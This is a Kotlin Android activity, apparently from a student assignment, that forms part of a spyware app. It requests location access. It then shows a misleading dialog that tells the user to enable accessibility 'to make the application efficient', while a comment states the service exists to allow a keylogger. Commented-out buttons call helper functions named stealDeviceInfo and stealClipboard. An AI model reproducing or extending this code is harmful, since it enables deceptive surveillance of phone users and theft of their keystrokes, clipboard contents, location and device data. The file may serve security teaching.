package com.example.assignment1

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.os.Bundle
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import com.example.assignment1.DataRetriever.FindLocation
import com.example.assignment1.DataRetriever.General


class MinYaoTest : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //setContentView(R.layout.activity_minyaotest)

        // Need this to allow finding of public IP
        val policy = ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)

        // Use functions in General Class
        val gn = General(this,this)

        // Use functions in FindLocation Class
        val gps = FindLocation(this, this)

        // Check if Location permission is allowed for this app and location service is enabled
        checkLocationPermission()
        statusCheck()

        // Check if accessibility is enabled
        accessibilityCheck()

        //val inputField = findViewById<EditText>(R.id.displayResult)

        // steps to get location
        /* findViewById<Button>(R.id.btn_get_location).setOnClickListener {
            inputField.setText(gps.getLocationDetails(), TextView.BufferType.EDITABLE)
        }

        // steps to get device info
        findViewById<Button>(R.id.btn_get_deviceinfo).setOnClickListener {
            inputField.setText(gn.stealDeviceInfo())
        }

        //steps to get clipboard
        findViewById<Button>(R.id.btn_get_clipboard).setOnClickListener {
            inputField.setText(gn.stealClipboard())
        } */
    }

    private fun checkLocationPermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 101)
            return
        }
    }

    private fun statusCheck() {
        val manager = getSystemService(LOCATION_SERVICE) as LocationManager
        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            buildAlertMessageNoGps()
        }
    }

    private fun buildAlertMessageNoGps() {
        val builder: AlertDialog.Builder = AlertDialog.Builder(this)
        builder.setMessage("Your GPS seems to be disabled, do you want to enable it?")
            .setCancelable(false)
            .setPositiveButton("Yes",
                DialogInterface.OnClickListener { dialog, id -> startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)) })
            .setNegativeButton("No",
                DialogInterface.OnClickListener { dialog, id -> dialog.cancel() })
        val alert: AlertDialog = builder.create()
        alert.show()
    }

    private fun accessibilityCheck() {
        // Make them enable a accessibilityservice that allows keylogger
        val accessibilityEnabled = isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)
        if(!accessibilityEnabled)
        {
            buildAlertMessageNoAccessibility()
            //startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun buildAlertMessageNoAccessibility() {
        val builder: AlertDialog.Builder = AlertDialog.Builder(this)
        builder.setMessage("Your Accessibility seems to be disabled, please enable it to make the application efficient!")
            .setCancelable(true)
            .setPositiveButton("Ok",
                DialogInterface.OnClickListener { dialog, id -> startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
        val alert: AlertDialog = builder.create()
        alert.show()
    }

    fun isAccessibilityServiceEnabled( context: Context, service: Class<out AccessibilityService?> ): Boolean {
        val am = context.getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
                    service.name
                )
            ) return true
        }
        return false
    }
}